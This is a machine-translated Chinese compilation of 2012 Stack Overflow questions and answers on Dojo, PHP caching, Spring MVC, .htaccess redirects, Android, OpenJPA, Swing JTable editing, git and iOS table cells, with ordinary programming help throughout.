把它换成 ，`eval()`你`echo`就会得到[这个](http://pastebin.com/kTE5RNJ6)。你不希望在你的服务器上。:)

# javascript - 使用 DOJO 将表单字段转换为 JSON 嵌套对象

> ID：13524474
> 
> 赞同：0
> 
> 时间：2012-11-23T07:05:04.147
> 
> 标签：javascript, json, dojo

我正在使用 DOJO 1.8 iand spring mvc。我想将表单字段转换为 JSON 对象并将其传递给控制器​​。使用 DOJO dom-form.toObject("myForm1") 如果它是一个简单的对象，我可以将 Json 传递给控制器​​。

如果我的模型对象具有内部对象，则 .toObject() 无法将其转换为嵌套的 JSON 对象。

```
var formObject1 = domForm.toObject("myForm1");
    alert("hi");
    require(["dojo/json"], function(JSON){
        postData = JSON.stringify(formObject1);
    });

    dojo.byId("testdiv").innerHTML = postData; 
```

我得到的Json是

> {"firstName":"12345","middleName":"Joanna","lastName":"Eliza","address.addrLine1":"add1","address.addrLine2":"add2","address.addrLine3" :"add3","email":"12345"}

但我需要如下，

> {"firstName":"12345","middleName":"Joanna","lastName":"Eliza", **"address":{"addrLine1":"add1","addrLine2":"add2","addrLine3": “添加 3”}**，“电子邮件”：“12345”}

DOJO 是否支持这种类型的 JSON 转换？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:11:06.110

Dojo 有各种各样的方法来完成这种任务。只需查看[文档](http://dojotoolkit.org/reference-guide/1.8/dojo/dom-form.html)并选择合适的解决方案即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T12:05:56.777

一个可以完成这项工作的简短功能：

```
// lang = require("dojo/_base/lang");
function deepenObject(/*Object*/ object) {    
    object = lang.clone(object);
    for(var key in object) {
        if(object.hasOwnProperty(key) && ~key.indexOf(".")) {
            lang.setObject(key, object[key], object);
            delete object[key];
        }       
    }
    return object;
} 
```

然后只是：

```
var result = deepenObject(formObject1); 
```

看看它在行动：http: [//jsfiddle.net/phusick/gaJ8C/](http://jsfiddle.net/phusick/gaJ8C/)

# php - 注销时删除缓存的内容

> ID：13524476
> 
> 赞同：-2
> 
> 时间：2012-11-23T07:05:13.353
> 
> 标签：php, caching

对于缓存页面，我在索引页面中设置了这个

```
ini_set('session.cache_limiter', 'private'); 
```

现在我想在注销过程中删除所有缓存的内容（想从用户浏览器中删除所有缓存的竞争）我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:31:00.087

检查以下内容。

```
session_cache_limiter( 'nocache' ); 
```

或者

```
session_cache_expire(30); 
```

# asp.net - ASP.NET 中的保存对话框

> ID：13524484
> 
> 赞同：0
> 
> 时间：2012-11-23T07:06:15.393
> 
> 标签：asp.net

> **可能重复：**
> [在 asp.net 中显示保存文件对话框](https://stackoverflow.com/questions/12351415/showing-save-file-dialog-box-in-asp-net)

目前，在我的网站中，用户可以从我的网站下载文件，并可选择打开/保存文件。除此之外，我想显示保存对话框，允许用户将文件保存到本地机器上的特定位置。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T10:32:39.587

允许用户选择下载文件的位置是浏览器设置，而不是您可以在代码中指定的设置。

根据我的经验，浏览器默认会自动保存到用户的“下载”文件夹等位置（在全新安装给定浏览器后，我似乎总是必须自己更改此选项）。

# spring - spring mvc applicationcontext.xml和spring servlet.xml的区别

> ID：13524489
> 
> 赞同：2
> 
> 时间：2012-11-23T07:06:37.207
> 
> 标签：spring, spring-mvc

在我的项目中，我们有一个 spring mvc 应用程序。它同时拥有 applicationcontext.xml 和 -servlet.xml 配置文件。Bean 定义分布在这两个文件中。

我想知道我们什么时候有 -servlet.xml 是否需要 applicationcontext.xml？

请在这方面提供任何解释。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:16:02.287

applicationContext.xml 将包含核心 spring 组件的 bean 定义。

project-servlet.xml 将具有独立 servlet 的 bean 定义。

-servlet.xml 可以引用 applicationContext.xml 而不是相反。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T07:15:22.800

您所指的`applicationContext.xml`是根应用程序上下文（当您需要在应用程序范围内访问它们时将 bean 放在那里），您所指的`[servlet]-context.xml`是 Spring MVC 的特定 Spring Bean 配置 xml `DispatcherServlet`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-23T07:16:17.480

servlet-context 特定于 servlet，应用程序上下文为整个应用程序共享。因此，当您在 servlet-context.xml 中定义 Bean 时，该 Bean 可用于该特定 servlet 的上下文，但当您在 ​​application-context.xml 中定义 Bean 时，它可用于整个应用程序。因此，如果您有多个 dispatcherServlet，您可以为每个 servlet 设置单独的 servlet-context。但是应用程序只有一个应用程序上下文

# php - 如何使用 .htaccess 将页面从 www.example.com/about.php 重定向到 www.example.com/beta/about.php？

> ID：13524490
> 
> 赞同：0
> 
> 时间：2012-11-23T07:06:37.093
> 
> 标签：php, .htaccess, redirect

我使用了以下代码，

**RewriteCond %{HTTP_HOST} ^example.com$ [NC] RewriteRule (.*)$ [http://www.example.com/beta/](http://www.example.com/beta/) $1 [R=301,L]**

但它只将 www.example.com 重定向到 www.example.com/beta/

我想将 www.example.com/about.php 重定向到 www.example.com/beta/about.php？

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:10:33.830

试试这个代码

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^www.example.com$ [NC]
RewriteRule ^(.*)$ http://www.example.com/beta/$1 [L,R=301] 
```

# android - 如何在android中预加载/缓存隐藏视图

> ID：13524496
> 
> 赞同：0
> 
> 时间：2012-11-23T07:07:31.373
> 
> 标签：android

所以我有一个布局包含 FrameLayout 的活动。此框架布局将替换为两个片段之一。

片段 A 将在创建视图时显示，并且有一个开关，选中后将切换到片段 B。

我试图使应用程序尽可能响应，但是第一次发生切换时会有明显的延迟，可能是由于视图的渲染，而对于后续切换，视图已经被缓存或诸如此类。

我如何在隐藏的同时让片段 B 视图呈现和缓存。同样，这是针对初始切换，而不是后续切换，因此使用隐藏显示片段而不是替换之类的操作将无济于事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:11:33.270

这个效果可以通过在XML布局文件或者代码中通过View.setVisibility(VIEW.INVISIBLE)指定android:visibility为“invisible”来实现；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:30:02.510

你做错了。**首先**你需要找出罪魁祸首是什么，**然后**优化或修复。分析你正在做某事的片段`onCreateView()`或其他方法，并找出什么是爬行。另请注意，设备会有所不同，您的问题可能仅在可用的最慢设备上可见。

这是[有关分析 Android 应用程序的文章](http://developer.android.com/tools/debugging/debugging-tracing.html)

# c++ - 如何在 C++ 中使用 Netusergetinfo() 获取用户域路径名称？

> ID：13524502
> 
> 赞同：0
> 
> 时间：2012-11-23T07:08:16.547
> 
> 标签：c++, windows, winapi

任何人都知道如何[`NetUserGetInfo()`](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa370654%28v=vs.85%29.aspx)使用 c++ 使用函数获取用户域路径？

# android - Android Services：获取服务所做更改的效果

> ID：13524508
> 
> 赞同：0
> 
> 时间：2012-11-23T07:08:26.850
> 
> 标签：android, service, android-manifest, android-service, android-location

我有一项服务可以在某个时差设置纬度和经度值（通过方法：Location.setLongitude .....）（从文本文件中获取纬度和经度值）。我可以在同一个应用程序中的 Activity 中获取 Lat Long 值吗？b）在其他一些应用程序中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:11:50.860

如果您使用绑定的服务，您将能够在该服务中实现侦听器接口，将您的活动订阅到服务的侦听器列表，并且每当您发现新数据时，您都会通知整个列表。实现起来并不难，如果你遇到这种情况，我可以为你提供一些代码帮助。

如果您使用已启动的服务，只需从您的服务中发送一些 Intent，并在您的 Activity 中注册一个 BroadcastListener。您只需在 Intent 中添加一些额外内容，您的 Activity 就会恢复它们。

使用 Intent 和 BroadcastReceiver 方法，您将能够在 2 个应用程序之间执行数据传输（使用自定义操作类型和意图过滤器）。

# java - ThrottleService(79)：无法读取网络统计信息

> ID：13524514
> 
> 赞同：2
> 
> 时间：2012-11-23T07:08:45.883
> 
> 标签：java, android, networking, mobile, xmpp

我收到异常`" ThrottleService(79): problem reading network stats"`
我不知道为什么这给了我异常，并且在应用程序中有一些与服务器的通信工作正常，但过去工作的 XMPP 数据包侦听器现在不工作。谁能告诉我出了什么问题？
请帮助我，在此先感谢。

XMPP 显示设备已登录并在服务器上在线。

我的环境：

# 服务器端 ：

操作系统：Windows
XMPP 服务器：Openfire 3.7.1。
阿帕奇 tomcat 6
Java 6

# 客户端 ：

Android 4.0.3
对于 XMPP 我正在使用 Smack 库

我该怎么办？我坚持这一点。

# 听到来自已弃用的 log-cat 的日志：---

```
11-23 11:46:11.932: WARN/ThrottleService(79): unable to find stats for iface rmnet0
11-23 11:46:11.932: WARN/ThrottleService(79): [ 11-23 11:47:58.421    79:0x74 F/NetworkStats ]
11-23 11:46:11.932: WARN/ThrottleService(79): problem reading network stats
11-23 11:46:11.932: WARN/ThrottleService(79): java.lang.IllegalStateException: problem parsing idx 1
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.internal.net.NetworkStatsFactory.readNetworkStatsDetail(NetworkStatsFactory.java:300)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.server.NetworkManagementService.getNetworkStatsUidDetail(NetworkManagementService.java:1282)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.server.net.NetworkStatsService.performPollLocked(NetworkStatsService.java:831)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.server.net.NetworkStatsService.performPoll(NetworkStatsService.java:799)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.server.net.NetworkStatsService.access$100(NetworkStatsService.java:128)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.server.net.NetworkStatsService$3.onReceive(NetworkStatsService.java:633)
11-23 11:46:11.932: WARN/ThrottleService(79):     at android.app.LoadedApk$ReceiverDispatcher$Args.run(LoadedApk.java:728)
11-23 11:46:11.932: WARN/ThrottleService(79):     at android.os.Handler.handleCallback(Handler.java:605)
11-23 11:46:11.932: WARN/ThrottleService(79):     at android.os.Handler.dispatchMessage(Handler.java:92)
11-23 11:46:11.932: WARN/ThrottleService(79):     at android.os.Looper.loop(Looper.java:137)
11-23 11:46:11.932: WARN/ThrottleService(79):     at android.os.HandlerThread.run(HandlerThread.java:60)
11-23 11:46:11.932: WARN/ThrottleService(79): Caused by: java.io.FileNotFoundException: /proc/net/xt_qtaguid/stats: open failed: ENOENT (No such file or directory)
11-23 11:46:11.932: WARN/ThrottleService(79):     at libcore.io.IoBridge.open(IoBridge.java:406)
11-23 11:46:11.932: WARN/ThrottleService(79):     at java.io.FileInputStream.<init>(FileInputStream.java:78)
11-23 11:46:11.932: WARN/ThrottleService(79):     at com.android.internal.net.NetworkStatsFactory.readNetworkStatsDetail(NetworkStatsFactory.java:269)
11-23 11:46:11.932: WARN/ThrottleService(79):     ... 10 more
11-23 11:46:11.932: WARN/ThrottleService(79): Caused by: libcore.io.ErrnoException: open failed: ENOENT (No such file or directory)
11-23 11:46:11.932: WARN/ThrottleService(79):     at libcore.io.Posix.open(Native Method)
11-23 11:46:11.932: WARN/ThrottleService(79):     at libcore.io.BlockGuardOs.open(BlockGuardOs.java:110)
11-23 11:46:11.932: WARN/ThrottleService(79):     at libcore.io.IoBridge.open(IoBridge.java:390)
11-23 11:46:11.932: WARN/ThrottleService(79):     ... 12 more 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-29T18:49:56.927

当我不小心从清单中删除以下行时，这发生在我身上：

```
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
```

一旦我把它加回去，一切就恢复正常了。

我希望这有帮助。

# java - OpenJPA 连接错误

> ID：13524516
> 
> 赞同：1
> 
> 时间：2012-11-23T07:08:54.040
> 
> 标签：java, hibernate, jpa, persistence, openjpa

我正在关注 OpenJPA 上的本教程-> [http://plunchete.wordpress.com/2007/05/06/using-openjpa/](http://plunchete.wordpress.com/2007/05/06/using-openjpa/)

我收到此错误：

```
160  INFO   [main] openjpa.Runtime - OpenJPA dynamically loaded the class enhancer. Any classes that were not enhanced at build time will be enhanced when they are loaded by the JVM.
188  INFO   [main] openjpa.Runtime - Starting OpenJPA 2.2.1
Exception in thread "main" <openjpa-2.2.1-r422266:1396819 fatal user error
org.apache.openjpa.persistence.ArgumentException: A JDBC Driver or DataSource class
name must be specified in the ConnectionDriverName property. Available properties in
configuration are "org.apache.openjpa.jdbc.conf.JDBCConfigurationImpl@442ce698".
at
org.apache.openjpa.jdbc.schema.DataSourceFactory.newDataSource(DataSourceFactory.java:72) 
```

Persistence.xml 是这样的：

```
<persistence xmlns="http://java.sun.com/xml/ns/persistence"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="1.0">
<persistence-unit name="example" transaction-type="RESOURCE_LOCAL">
<provider>
org.apache.openjpa.persistence.PersistenceProviderImpl
</provider>
<class>Person</class>
<properties>
<property name="openjpa.jdbc.SynchronizeMappings" value="buildSchema" />
<property name="openjpa.ConnectionDriverName" value="com.mysql.jdbc.Driver" />
<property name="openjpa.ConnectionURL" value="jdbc:mysql://localhost:3306/cs5200" /
<property name="openjpa.ConnectionUserName" value="root" />
<property name="openjpa.ConnectionPassword" value="" />
</properties>
</persistence-unit>
</persistence> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:17:21.967

错误是文件夹结构错误。

META-INF 应该在 src 文件夹中。

不是那样的。我研究并测试了不同的东西并提出了这个解决方案。

我希望将来对某人有所帮助。

# java - JTable.columnMoved 方法的一个错误

> ID：13524519
> 
> 赞同：4
> 
> 时间：2012-11-23T07:09:04.550
> 
> 标签：java, swing, jtable, tablecelleditor

javax.swing.JTable 有一个错误，如果我们在编辑空值单元格时对表格进行排序，并且其列类没有带有“new Object[] { new String() }”参数的构造函数，例如。Long.class，JTable 会抛出异常。

我认为这是因为 javax.swing.JTable 尝试删除单元格编辑器两次；所以我计划将 JTable.columnMoved 方法重写为：

```
@Override
public void columnMoved(TableColumnModelEvent e) {
    if (isEditing() && !getCellEditor().stopCellEditing()) {
        if(getCellEditor() != null) { // In javax.swing.JTable, no this check point
            getCellEditor().cancelCellEditing();
        }
    }
    repaint();
} 
```

我觉得不够好，因为它对代码读者不友好，他们可能对JTable很了解，不喜欢我这样的子类。有更好的解决方案吗？非常感谢。

运行以下代码时，双击一个单元格（不要输入任何内容），然后单击表头，就会出现异常。

```
public class NewJFrame extends javax.swing.JFrame {

    public NewJFrame() {
        initComponents();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jTable1 = new javax.swing.JTable();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jTable1.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {
                {null, null},
                {null, null},
                {null, null},
                {null, null}
            },
            new String [] {
                "Title 1", "Title 2"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.Long.class, java.lang.Long.class
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }
        });
        jScrollPane1.setViewportView(jTable1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 375, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(15, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 275, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(14, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(NewJFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(NewJFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(NewJFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(NewJFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new NewJFrame().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTable jTable1;
    // End of variables declaration
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:43:43.130

我可以使用您提供的代码重现该问题。我责怪`JTable#stopCellEditing`实施

```
 public boolean stopCellEditing() {
        String s = (String)super.getCellEditorValue();
        // Here we are dealing with the case where a user
        // has deleted the string value in a cell, possibly
        // after a failed validation. Return null, so that
        // they have the option to replace the value with
        // null or use escape to restore the original.
        // For Strings, return "" for backward compatibility.
        if ("".equals(s)) {
            if (constructor.getDeclaringClass() == String.class) {
                value = s;
            }
            super.stopCellEditing();
        }

        try {
            value = constructor.newInstance(new Object[]{s});
        }
        catch (Exception e) {
            ((JComponent)getComponent()).setBorder(new LineBorder(Color.red));
            return false;
        }
        return super.stopCellEditing();
    } 
```

你输入第一个 if, where`super.stopCellEditing`被调用。此调用的返回值被忽略。然后`newInstance`调用抛出一个异常，该异常被捕获但随后`false`返回，无论返回值是什么`super.stopCellEditing`。这对我来说听起来不正确。我将使用您提供的代码向 Oracle 记录错误

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T07:39:29.567

我看不到任何问题，任何错误，TableCellEditor 在排序和列重新排序时被正确取消，

```
import java.awt.*;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;

public class TableWithTimer {

    private static final long serialVersionUID = 1L;
    private JFrame frame = new JFrame();
    private JScrollPane scroll = new JScrollPane();
    private JTable myTable;
    private String[] head = {"One", "Two", "Three", "Four", "Five", "Six"};
    private Object[][] data = {{null, null, null, null, null, null},
        {null, null, null, null, null, null},
        {null, null, null, null, null, null},
        {null, null, null, null, null, null},
        {null, null, null, null, null, null},
        {null, null, null, null, null, null},
        {null, null, null, null, null, null}};
    private DefaultTableModel model;

    public TableWithTimer() {
        model = new DefaultTableModel(data, head) {

            private static final long serialVersionUID = 1L;

            @Override
            public Class<?> getColumnClass(int colNum) {
                switch (colNum) {
                    case 0:
                        return Integer.class;
                    case 1:
                        return Double.class;
                    case 2:
                        return Long.class;
                    case 3:
                        return Boolean.class;
                    default:
                        return String.class;
                }
            }
        };
        myTable = new JTable(model);
        myTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        myTable.setGridColor(Color.gray);
        myTable.setFillsViewportHeight(true);
        myTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        myTable.setAutoCreateRowSorter(true);
        scroll.setViewportView(myTable);
        frame.add(scroll, BorderLayout.CENTER);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLocation(100, 100);
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String args[]) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                TableWithTimer tableWithTimer = new TableWithTimer();
            }
        });
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-05T16:55:25.527

这个问题 - @Robin 正确分析 - 有几个方面：

*   即使返回 false，stopCellEditing 也错误地触发了 editingStopped
*   如果构造函数接受空值，则 stopCellEditing 触发两次

虽然第二个“只是”违反了合同，但第一个具有严重的后果：

*   如 OP 的问题中所述：如果客户端代码试图真正终止编辑，则抛出 NPE，即首先停止并在失败时取消。具有讽刺意味的是，最明显的外观出现在 jdk7 table.columnMoved - 以前（直到 jdk6）不正确的 removeEditor 被 Right-Thing 替换。
*   如果从编辑时删除的有效值开始编辑可能会导致数据损坏：editingStopped 事件触发表以将 tableModel 中的有效值替换为 null ...

有足够的理由通过 GenericEditor 中的不同逻辑在 JXTable 中进行修复（该修复也可以在自定义 GenericEditor 中使用，与 swingx 没有耦合：只需 c&p 核心 GenericEditor 并将其 stopCellEditing 替换为以下内容）：

```
@Override
public boolean stopCellEditing() {
    String s = (String) super.getCellEditorValue();
    // JW: changed logic to hack around (core!) Issue #1535-swingx
    // don't special case empty, but string contructor:
    // if so, by-pass reflection altogether
    if (constructor.getDeclaringClass() == String.class) {
        value = s;
    } else { // try instantiating a new Object with the string 
        try {
            value = constructor.newInstance(new Object[] { s });
        } catch (Exception e) {
            ((JComponent) getComponent()).setBorder(new LineBorder(
                    Color.red));
            return false;
        }
    }
    return super.stopCellEditing();
} 
```

# git - 如何在没有提交的情况下从 git 中的分支获取更改？

> ID：13524521
> 
> 赞同：2
> 
> 时间：2012-11-23T07:09:16.440
> 
> 标签：git

我正在寻找一种不那么垃圾的方法：

```
git diff patch.DisableCreditCheck > ~/patch
patch -p1 < ~/patch 
```

IE。来自分支的更改为原始未提交更改。

patch 的缺点是它不是很聪明。例如，我经常得到“检测到反向（或以前应用的）补丁！假设 -R[n]？” 当没有任何以前的补丁时，只是碰巧有一组文件名会被它弄糊涂。

能够做到这一点会*更好：*

```
git merge --no-commit --no-ff patch.DisableCreditCheck 
```

...但这会使您处于合并状态，没有明显的方法可以在保留更改的同时恢复正常状态。

帮助！有什么体面的方法吗？

（当您在正在处理的代码上共享补丁时，这是一件非常有用的事情；比传递一组补丁文件要好得多）

编辑：作为我想要实现的一个例子，假设我们有两个分支，master 和 config.me。

当我做 git diff config.me > ~/patch; patch -p1 < ~/patch 结果是：

```
$ git status
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#       modified:   Web/Web.config
# 
```

这是理想的结果......但不使用补丁，它不能很好地工作（特别是在 Windows 上，它在检测应该完美合并的更改方面似乎非常糟糕，但相反它会感到困惑并写出一堆 .orig和 .rej 文件）。

所以，就像我说的；我希望*没有提交*的分支中的更改作为本地*未提交的更改*。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T02:09:58.787

您的第一个示例表明您不希望特定分支的*更改*（即提交增量），而是希望您的工作树*反映该分支的最新状态*。（在尝试选择正确的命令时可能会导致混淆的细微差别。）

几种方式：

**方法一：**

```
$ git checkout patch.DisableCreditCheck . 
```

这使您的工作树镜像`patch.DisableCreditCheck`。`HEAD`an之间的更改`patch.DisableCreditCheck`会自动进行。注意事项：它还会清除工作树中任何未提交的更改。（注意：句点 ( `.`) 必须是工作树根的路径。）

**方法二：**

```
$ git read-tree patch.DisableCreditCheck 
```

这会使您的*索引*变为 mirror `patch.DisableCreditCheck`，但保持工作树不变。

**方法三：**

```
$ git checkout --detached patch.DisableCreditCheck
$ git reset your-original-branch
$ git checkout -B your-original-branch 
```

*这是一种愚蠢的方法，与Method 1*大致相同。它包含在学院中，因为它可能更容易理解。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T08:37:41.547

两种方式：

**首先**，如果您想要更改`branchA`但不希望它们在分支中提交`branchB`：

```
>> git checkout branchB
>> git cherry-pick -n ..branchA 
```

这将获得“在 B 和 A 之间”发生但不提交的所有提交。`git status`将显示一堆更改的文件。

**其次**，如果您想在新提交中进行更改，但不一定是*您所做的每一次提交*：

```
>> git checkout branchA
>> git rebase -i branchB 
```

这会将您的分支`A`重新设置为基础，`B`但会让您选择`pick`至`squash`. Squashing 基本上会将几个提交折叠成一个更大的提交。有关`git help rebase`挤压的更多信息，请参阅。

# ios - 为什么我的自定义 UITableViewCell 永远不会从原型中改变？

> ID：13524525
> 
> 赞同：2
> 
> 时间：2012-11-23T07:09:37.210
> 
> 标签：ios, ios6

我有一个扩展 UITableViewCell 的自定义类。它有两个标签和一个 UISegmentedControl。

这是我配置的 cellForRowAtIndexPath()。当我在调试器中检查“单元格”时，它拥有我提供的所有数据。但不知何故，这些数据永远不会被应用。

```
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"MyCell";
    CustomGameCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (!cell) {
        cell = [[CustomGameCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    MyData *my_data = [rows objectAtIndex:indexPath.row];

    UILabel *my_date = [[UILabel alloc] init];
    my_date.text = my_data.myDate;
    [cell setMyDateLabel:my_date];

    UILabel *my_question = [[UILabel alloc] init];
    my_question.text = my.question;
    [cell setMyQuestionLabel:my_question];

    UISegmentedControl *my_choices = [[UISegmentedControl alloc]
                                        initWithItems:[NSArray arrayWithObjects:my.firstChoice, my.secondChoice, nil]];
    [my_choices setSelectedSegmentIndex:my.choice];
    [cell setMyChoiceSegments:my_choices];

    return cell
} 
```

我想要显示的数据当前位于我在 viewDidLoad() 中创建的数组中，cellForRowAtIndexPath() 可以通过“rows”var 访问该数组。

当我在模拟器中运行代码时，我在表中得到三行，代表我在 viewDidLoad() 中创建的数组中的三个元素。但是，这些行的内容看起来与我在情节提要中定义的完全一样。

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:19:02.693

您必须在单元格的单元格内容视图中添加标签和段控件，如果没有，请这样做。

```
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"MyCell";
    CustomGameCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (!cell) {
        cell = [[CustomGameCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    MyData *my_data = [rows objectAtIndex:indexPath.row];

    cell.myDateLabel.text = my_data.myDate;

    cell.myQuestionLabel.text = my.question;

    [cell.myChoiceSegments setSelectedSegmentIndex:my.choice];

    [cell autorelease];
    return cell
} 
```

也`autorelease`用于内存管理。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T07:45:35.657

1.  您在哪里定义单元格的布局？在NIB中？在你的故事板中？以编程方式在您`initWithStyle`的`CustomGameCell`? 根据您使用的方法，实现细节会有所不同，但您肯定需要在情节提要中定义 NIB 或原型单元，或者以编程方式创建控件、设置它们的框架、执行`addSubview`以便将它们包含在单元中等。

2.  您的代码正在添加新`UILabel`对象，而不是将它们作为子视图添加到任何内容中，无论您是否使用出列单元格都这样做，等等。所以这里有很多问题。要查看如何正确使用自定义单元格的示例，请参阅*Table View Programming Guide*中的自定义单元[格。](http://developer.apple.com/library/ios/documentation/userexperience/conceptual/tableview_iphone/TableViewCells/TableViewCells.html#//apple_ref/doc/uid/TP40007451-CH7-SW18)但是，就像我说的那样，细节会根据您设计子类布局的方式而有所不同，因此在您指定如何设计用户界面之前，我会犹豫提出任何代码。*`UITableViewCell`*

# api - 通过在我的网站页面上使用 LinkedIn 电子邮件和密码导入链接的个人资料而不重定向 LinkedIn 网站页面？

> ID：13524534
> 
> 赞同：2
> 
> 时间：2012-11-23T07:10:29.217
> 
> 标签：api, linkedin

我的要求如下，当我输入电子邮件和密码并单击连接到 LinkedIN 按钮时，我有网页自己的登录页面，然后请求转到linkedin 并导入 LinkedIn 个人资料（与获取谷歌联系人列表相同）并显示我的网页而不重定向到linkedin授权页面或没有在我的应用程序中嵌入Linkedin导入配置文件按钮。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T01:06:48.143

如果我对您的理解正确，您想要做的是违反 LinkedIn API 服务条款：

[https://developer.linkedin.com/documents/linkedin-apis-terms-use](https://developer.linkedin.com/documents/linkedin-apis-terms-use)

> 为了通过 API 访问会员特定内容，您的用户必须使用他们的 LinkedIn 凭据登录并授予您的应用程序访问其内容的权限。

您的用户无法通过您自己的网站登录，然后在没有先授权您访问的情况下自动登录 LinkedIn。

# android - 作为 iOS 的 NSTimer 调度程序，如何使多线程以静态频率运行？

> ID：13524543
> 
> 赞同：0
> 
> 时间：2012-11-23T07:11:16.000
> 
> 标签：android, multithreading, timer

作为 iOS 的 NSTimer 调度程序，如何使 Android 中的多线程以静态频率运行？我想在每个固定时间运行一些功能。而 iOS（Cocoa 库）为此提供了 NSTimer 调度程序。

感谢您的阅读。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:27:54.473

**对于重复任务：**

```
new Timer().scheduleAtFixedRate(task, after, interval); 
```

**对于任务的单次运行：**

```
new Timer().schedule(task, after); 
```

例如，

```
myTimer = new Timer();
        myTimer.schedule(new TimerTask() {          
            @Override
            public void run() {
                // do something
            }

        }, 0, 1000); 
```

# drupal - 覆盖 Drupal 中 user_register 表单的提交函数

> ID：13524546
> 
> 赞同：3
> 
> 时间：2012-11-23T07:11:24.620
> 
> 标签：drupal

